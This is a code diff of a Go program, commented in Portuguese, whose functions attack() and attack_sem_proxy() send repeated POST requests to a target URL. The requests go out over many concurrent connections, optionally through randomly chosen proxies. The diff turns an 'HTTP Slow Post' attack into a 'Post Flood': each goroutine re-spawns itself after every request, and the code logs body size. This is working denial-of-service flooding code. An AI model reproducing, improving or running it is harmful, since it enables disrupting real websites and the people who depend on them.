@@ -150,7 +150,7 @@ func isURLEncoded(input string) bool {
 
 func bodyForRequest() string {
     // Criando a string de corpo diretamente
-    var body string
+    /* var body string
     for key, value := range paramsParsed {
         var variable string
         var valor string
@@ -168,6 +168,18 @@ func bodyForRequest() string {
     // Remove o último '&'
     if len(body) > 0 {
         body = body[:len(body)-1]
+    }
+    return body*/
+    var bodyBuffer bytes.Buffer
+
+    // Create the request body
+    for key, value := range paramsParsed {
+        bodyBuffer.WriteString(fmt.Sprintf("%s=%s&", key, value))
+    }
+    // Remove the trailing '&'
+    body := bodyBuffer.String()
+    if len(body) > 0 {
+        body = body[:bodyBuffer.Len()-1]
     }
     return body
 }
@@ -233,6 +245,10 @@ func attack(ctx context.Context, proxyURL string, stopChan <-chan struct{}) {
             defer resp.Body.Close()
 
             fmt.Println("Response status:", resp.Status)
+            sizeInBytes := len(body)
+            sizeInKB := float64(sizeInBytes) / 1024
+
+            fmt.Printf("Tamanho do corpo em KB: %.2f KB\n", sizeInKB)
 			go attack(ctx, proxyURL, stopChan)
     }
 }
@@ -310,6 +326,11 @@ func attack_sem_proxy(ctx  context.Context, stopChan <-chan struct{}) {
 
             // Aqui você pode processar a resposta do POST, se necessário
             fmt.Println("POST request successful, status code:", postResp.StatusCode)
+            sizeInBytes := len(body)
+            sizeInKB := float64(sizeInBytes) / 1024
+
+            fmt.Printf("Tamanho do corpo em KB: %.2f KB\n", sizeInKB)
+            go attack_sem_proxy(ctx, stopChan)
 /*
             // Ler o corpo da resposta
             bodyBytes, erro := ioutil.ReadAll(postResp.Body)
@@ -324,7 +345,6 @@ func attack_sem_proxy(ctx  context.Context, stopChan <-chan struct{}) {
             // Exibir o corpo da resposta
             fmt.Println("Response body:", bodyN)
 */
-			go attack_sem_proxy(ctx, stopChan)
     }
 }
 func main() {
@@ -333,7 +353,7 @@ func main() {
     ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
     defer cancel()
     stopChan := make(chan struct{})
-    fmt.Println("Iniciando ataque HTTP Slow Post em", targetURL)
+    fmt.Println("Iniciando ataque Post Flood em", targetURL)
     for i := 0; i < numConnections; i++ {
         if len(proxies) > 0 {
             go attack(ctx, proxies[rand.Intn(len(proxies))], stopChan)
